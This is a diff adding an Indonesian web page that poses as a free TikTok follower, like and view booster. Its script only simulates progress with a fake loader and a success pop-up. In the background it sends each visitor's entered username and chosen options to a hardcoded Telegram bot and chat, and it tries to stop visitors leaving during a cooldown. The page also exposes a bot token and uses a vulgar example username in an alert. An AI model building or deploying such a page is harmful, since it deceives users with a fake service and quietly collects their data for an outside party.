@@ -1,0 +1,387 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Booster TikTok (UI Saja)</title>
+  <style>
+    :root{--bg:#0f172a;--card:#0b1220;--accent:#7c3aed;--muted:#94a3b8;--glass: rgba(255,255,255,0.03);--danger:#ef4444}
+    *{box-sizing:border-box}
+    
+    /* PENTING: Mengatur body agar tidak ada margin ekstra dan background menutupi penuh */
+    body{
+        font-family:Inter, ui-sans-serif, system-ui, -apple-system, 'Segoe UI', Roboto; 
+        margin:0; 
+        min-height:100vh; 
+        background:linear-gradient(180deg,#071027 0%, #07182a 100%); 
+        color:#e6eef8; 
+        /* Menggunakan flex untuk centering utama */
+        display:flex; 
+        align-items:center; 
+        justify-content:center; 
+        padding:24px;
+        /* Menghindari scroll body kecuali jika konten benar-benar overflow */
+        overflow-y: auto; 
+    }
+    
+    .container{
+        width:100%;
+        max-width:920px;
+        background:var(--card);
+        border-radius:14px;
+        padding:20px;
+        box-shadow:0 10px 30px rgba(2,6,23,0.6);
+        /* Tambahan: Mengatur max-height untuk mencegah konten terlalu panjang di layar kecil */
+        max-height: calc(100vh - 48px); /* Tinggi maksimum viewport dikurangi padding body 2x24px */
+        overflow-y: auto; /* Memungkinkan scrolling internal pada container jika diperlukan */
+    }    
+    
+    h1{margin:0 0 6px;font-size:20px}
+    p.lead{margin:0 0 18px;color:var(--muted)}
+    .steps{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:16px;border-radius:12px}
+    label{display:block;margin-bottom:8px;font-size:13px;color:var(--muted)}
+    input[type=text]{width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
+    .boost-options{display:flex;flex-wrap:wrap;gap:10px;justify-content:center}
+    .option{padding:12px 16px;border-radius:12px;background:var(--glass);cursor:pointer;border:1px solid rgba(255,255,255,0.03);min-width:130px;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center}
+    .option small{color:var(--muted);font-size:12px}
+    .option input{display:none}
+    .option.active{background:linear-gradient(90deg, rgba(124,58,237,0.16), rgba(124,58,237,0.06));box-shadow:0 6px 18px rgba(124,58,237,0.07);border:1px solid rgba(124,58,237,0.22)}
+    .packages{display:flex;gap:10px;flex-wrap:wrap;justify-content:center}
+    .pkg{flex:1;padding:12px;border-radius:10px;background:rgba(255,255,255,0.02);text-align:center;cursor:pointer;border:1px solid rgba(255,255,255,0.03);min-width:120px}
+    .pkg.disabled{opacity:0.45;cursor:not-allowed}
+    .pkg input{display:none}
+    .pkg.selected{border:1px solid rgba(34,197,94,0.18);box-shadow:0 6px 20px rgba(34,197,94,0.04)}
+    .footer{display:flex;align-items:center;gap:12px;justify-content:space-between;margin-top:16px}
+    button{padding:10px 16px;border-radius:10px;border:0;background:var(--accent);color:white;cursor:pointer;transition:background 0.3s;}
+    button:disabled{background:#4b5563;cursor:not-allowed;} 
+    button.ghost{background:transparent;border:1px solid rgba(255,255,255,0.04)}
+    .summary{background:rgba(255,255,255,0.02);padding:12px;border-radius:10px;color:var(--muted)}
+    .hidden{display:none}
+    .center{display:flex;align-items:center;justify-content:center}
+    .loader{width:44px;height:44px;border-radius:50%;border:5px solid rgba(255,255,255,0.06);border-top-color:var(--accent);animation:spin 1s linear infinite;margin:auto}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    @media (max-width:720px){.steps{grid-template-columns:1fr}}
+    
+    /* Style untuk modal/pop-up sukses - Tetap di posisi tetap dan menutupi semua */
+    #successModal{
+      position:fixed;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      background:rgba(0,0,0,0.8);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      z-index:9999;
+    }
+    #cooldownDisplay{
+        font-weight: bold;
+        color: var(--danger);
+        margin-left: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div style="text-align:right;margin-bottom:10px;opacity:0.9">
+      <a href="https://t.me/lwkysie" target="_blank" style="text-decoration:none;color:inherit;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" width="32" style="filter:invert(0.85)">
+      </a>
+    </div>
+
+    <div style="font-size:12px; color:var(--muted); margin-bottom: 4px;">Made by iEelXyz & API4APIHnz & QwertyDear</div> 
+
+    <h1>Booster TikTok — Full Release</h1>
+    <p class="lead">Boost TikTok account for free, boost will be sent automatically sent to server (smooth server, fast boost), if you find a bug, please report it to the developer.</p>
+
+    <div class="steps">
+      <div class="card" id="step-1">
+        <label for="username">1. Masukkan username / TikTok ID</label>
+        <input type="text" id="username" placeholder="misal: @namamu atau user123" />
+
+        <div style="margin-top:12px">
+          <button id="toStep2" class="ghost">Next</button>
+        </div>
+      </div>
+
+      <div class="card" id="step-2">
+        <label>2. Pilih yang ingin diboost</label>
+        <div class="boost-options" id="boostOptions">
+          <div class="option" data-key="followers">Followers<br><small>Tambah pengikut</small></div>
+          <div class="option" data-key="likes">Like<br><small>Tambah suka</small></div>
+          <div class="option" data-key="views">View<br><small>Tambah tayangan</small></div>
+          <div class="option" data-key="favorite">Favorite<br><small>Tambah favorit</small></div>
+          <div class="option" data-key="share">Share<br><small>Tambah dibagikan</small></div>
+        </div>
+
+        <div style="margin-top:14px">
+          <label>Pilih Paket</label>
+          <div class="packages">
+            <div class="pkg disabled" data-key="vvip" title="PREMIUM">
+              <strong>VVIP</strong><div style="font-size:12px;color:var(--muted)">VVIP PAID</div>
+            </div>
+            <label class="pkg" data-key="reguler">
+              <input type="radio" name="package" value="reguler" />
+              <strong>REGULER</strong><div style="font-size:12px;color:var(--muted)">TOP CHOICE</div>
+            </label>
+            <label class="pkg" data-key="normal">
+              <input type="radio" name="package" value="normal" />
+              <strong>NORMAL</strong><div style="font-size:12px;color:var(--muted)">ECONOMIC CHOICE</div>
+            </label>
+          </div>
+        </div>
+
+        <div style="margin-top:12px;display:flex;gap:8px;">
+          <button id="backStep1" class="ghost">Kembali</button>
+          <button id="toStep3">Lanjut Boost</button>
+        </div>
+      </div>
+
+      <div class="card" id="step-3" style="grid-column:1/3">
+        <label>3. Next</label>
+        <div class="summary" id="summaryBox">Belum ada pilihan.</div>
+
+        <div style="margin-top:12px;display:flex;gap:8px;align-items:center">
+          <button id="startBoost">Mulai Boost</button>
+          <button id="reset" class="ghost">Back</button>
+          <div id="status" style="margin-left:auto;color:var(--muted);display:flex;align-items:center;">
+             <span id="cooldownText"></span>
+             <span id="cooldownDisplay"></span>
+          </div>
+        </div>
+
+        <div id="progressArea" class="hidden" style="margin-top:12px">
+          <div class="center" style="padding:18px 0">
+            <div class="loader" id="fakeLoader"></div>
+          </div>
+          <div id="progressText" class="center" style="padding-bottom:8px;color:var(--muted)">Running & Connect...</div>
+        </div>
+      </div>
+    </div>
+
+    <div id="successModal" style="display:none">
+      <div style="background:#0b1220;padding:30px 40px;border-radius:14px;text-align:center;box-shadow:0 0 20px rgba(0,0,0,0.4);">
+        <div style="font-size:60px;color:#22c55e;margin-bottom:10px">✓</div>
+        <div style="font-size:18px;color:#e6eef8">Boost Successfully</div>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    // --- Konfigurasi Telegram Bot ---
+    const TELEGRAM_BOT_TOKEN = '8453567831:AAG2FQPHgl9Lo7_uBMd4gnOaWHs959hlfmA';
+    const TELEGRAM_CHAT_ID = '7326526945';
+    // --- Konfigurasi Cooldown ---
+    const COOLDOWN_TIME_SECONDS = 45; // 45 detik
+    // ---------------------------------------------------------
+
+    // Basic UI-only logic
+    const toStep2 = document.getElementById('toStep2');
+    const toStep3 = document.getElementById('toStep3');
+    const backStep1 = document.getElementById('backStep1');
+    const usernameInput = document.getElementById('username');
+    const boostOptions = document.getElementById('boostOptions');
+    const summaryBox = document.getElementById('summaryBox');
+    const startBoost = document.getElementById('startBoost');
+    const resetBtn = document.getElementById('reset');
+    const progressArea = document.getElementById('progressArea');
+    const statusText = document.getElementById('cooldownText'); 
+    const cooldownDisplay = document.getElementById('cooldownDisplay');
+
+    let currentSummaryData = null; 
+    let isCooldownActive = false; 
+
+    function showStep(n){
+      document.getElementById('step-1').style.display = n===1? 'block':'none';
+      document.getElementById('step-2').style.display = n===2? 'block':'none';
+      document.getElementById('step-3').style.display = n===3? 'block':'none';
+    }
+    showStep(1);
+    updateCooldownUI(0); 
+
+    // --- FUNGSI PENCEGAHAN REFRESH/TUTUP JENDELA ---
+    function preventClose(e) {
+      if (isCooldownActive) {
+        e.preventDefault(); 
+        e.returnValue = 'Boost sedang dalam Cooldown. Apakah Anda yakin ingin keluar?'; 
+      }
+    }
+    window.addEventListener('beforeunload', preventClose);
+
+    // --- FUNGSI COOLDOWN ---
+    function updateCooldownUI(remainingSeconds) {
+        if (remainingSeconds > 0) {
+            isCooldownActive = true;
+            startBoost.disabled = true;
+            resetBtn.disabled = true;
+            statusText.textContent = 'Cooldown:';
+            cooldownDisplay.textContent = `${remainingSeconds}s`;
+        } else {
+            isCooldownActive = false;
+            startBoost.disabled = false;
+            resetBtn.disabled = false;
+            statusText.textContent = 'Ready';
+            cooldownDisplay.textContent = '';
+        }
+    }
+
+    function startCooldown() {
+      let timeLeft = COOLDOWN_TIME_SECONDS;
+      updateCooldownUI(timeLeft);
+
+      const interval = setInterval(() => {
+        timeLeft--;
+        updateCooldownUI(timeLeft);
+        
+        if (timeLeft <= 0) {
+          clearInterval(interval);
+          updateCooldownUI(0);
+        }
+      }, 1000);
+    }
+    // ------------------------------------------------
+
+    toStep2.onclick = ()=>{
+      if (isCooldownActive) return; 
+      const v = usernameInput.value.trim();
+      
+      if(!v){
+        alert('Silakan isi username terlebih dulu.');
+        usernameInput.focus();
+        return;
+      }
+      
+      // PENAMBAHAN VALIDASI: Harus diawali '@'
+      if (!v.startsWith('@')) {
+        alert('Username TikTok harus diawali dengan karakter "@". Contoh: @memekhitam');
+        usernameInput.focus();
+        return;
+      }
+      
+      showStep(2);
+    }
+    backStep1.onclick = ()=> showStep(1);
+
+    // boost options toggle (tetap sama)
+    boostOptions.addEventListener('click', e=>{
+      const opt = e.target.closest('.option');
+      if(!opt) return;
+      opt.classList.toggle('active');
+    });
+
+    // package select visuals (tetap sama)
+    document.querySelectorAll('.pkg').forEach(el=>{
+      if(el.classList.contains('disabled')) return; 
+      el.addEventListener('click', ()=>{
+        document.querySelectorAll('.pkg').forEach(p=>p.classList.remove('selected'));
+        el.classList.add('selected');
+        el.querySelector('input') && (el.querySelector('input').checked = true);
+      });
+    });
+
+    toStep3.onclick = ()=>{
+      if (isCooldownActive) return; 
+
+      const chosen = Array.from(document.querySelectorAll('.option.active')).map(x=>x.dataset.key);
+      const pkgEl = Array.from(document.querySelectorAll('.pkg.selected')).map(x=>x.dataset.key)[0];
+      const username = usernameInput.value.trim();
+
+      if(!username){ alert('Username kosong.'); showStep(1); return; }
+      if(chosen.length===0){ alert('Pilih minimal satu jenis boost.'); return; }
+      if(!pkgEl){ alert('Pilih Paket, REGULER atau NORMAL. (PREMIUM tidak bisa dipilih karena tidak saldo tidak cukup.)'); return; }
+
+      // Simpan data ringkasan ke variabel
+      currentSummaryData = {
+        username: username,
+        boosts: chosen,
+        package: pkgEl.toUpperCase(),
+        time: new Date().toLocaleString()
+      };
+
+      summaryBox.innerHTML = `<strong>Username:</strong> ${escapeHtml(username)}<br>`+
+                             `<strong>Jenis Boost:</strong> ${chosen.join(', ')}<br>`+
+                             `<strong>Paket:</strong> ${pkgEl.toUpperCase()}<br>`+
+                             `<small style="color:var(--muted)">Note : Lama Boost Tergantung Server API (Connect), Jika Server Lancar Maka Boost Akan Berhasil Dalam Estimasi 10-20 Menit</small>`;
+      showStep(3);
+    }
+
+    // Fungsi untuk mengirim pesan ke Telegram (tetap sama)
+    function sendToTelegram(data) {
+      if (!data) return;
+      
+      const message = `🚀 *Boost Berhasil!* 🚀\n\n` +
+                      `*Waktu :* ${data.time}\n` +
+                      `*Username :* \`${data.username}\`\n` +
+                      `*Jenis Boost :* ${data.boosts.join(', ')}\n` +
+                      `*Paket :* ${data.package}\n\n` +
+                      `_Made by iEelXyz & SaveAPI_`;
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => response.json())
+      .then(res => {
+        console.log('Telegram response:', res);
+      })
+      .catch(error => {
+        console.error('Error sending to Telegram:', error);
+      });
+    }
+
+    startBoost.onclick = ()=>{
+      if (isCooldownActive) return; 
+
+      progressArea.style.display='flex';
+      statusText.textContent = 'Connect to Server API...';
+      cooldownDisplay.textContent = ''; 
+      startBoost.disabled = true;
+
+      setTimeout(()=>{
+        progressArea.style.display='none';
+        
+        // 1. Kirim data ke Telegram
+        sendToTelegram(currentSummaryData);
+
+        // 2. Tampilkan modal sukses
+        const modal = document.getElementById('successModal');
+        modal.style.display='flex';
+        setTimeout(()=>{
+          modal.style.display='none';
+        }, 1600);
+        
+        // 3. Mulai Cooldown
+        startCooldown();
+
+      }, 3700); // Durasi simulasi
+    }
+
+    resetBtn.onclick = ()=>{
+      if (isCooldownActive) return; 
+      usernameInput.value = '';
+      document.querySelectorAll('.option').forEach(o=>o.classList.remove('active'));
+      document.querySelectorAll('.pkg').forEach(p=>p.classList.remove('selected'));
+      document.querySelectorAll('input[name=package]').forEach(i=>i.checked=false);
+      summaryBox.innerHTML = 'Belum ada pilihan.';
+      currentSummaryData = null; 
+
+      showStep(1);
+    }
+
+    function escapeHtml(str){
+      return str.replace(/[&<>"']/g, c=>({
+        '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"}[c] || c));
+    }
+  </script>
+</body>
+</html>
